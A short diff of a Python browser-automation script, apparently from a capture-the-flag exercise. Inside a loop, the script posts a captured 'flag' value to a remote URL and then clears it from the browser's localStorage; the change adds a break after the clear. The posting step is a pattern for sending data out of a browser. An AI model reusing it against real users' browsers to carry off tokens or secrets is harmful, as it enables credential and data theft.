@@ -34,6 +34,6 @@ while True:
         if flag:
             try: requests.post(URL, data={"content": flag}, timeout=3)
             except Exception: pass
-            try: browser.execute_script(f"localStorage.removeItem('{KEY}')")
+            try: browser.execute_script(f"localStorage.removeItem('{KEY}')"); break
             except Exception: pass
     time.sleep(1)
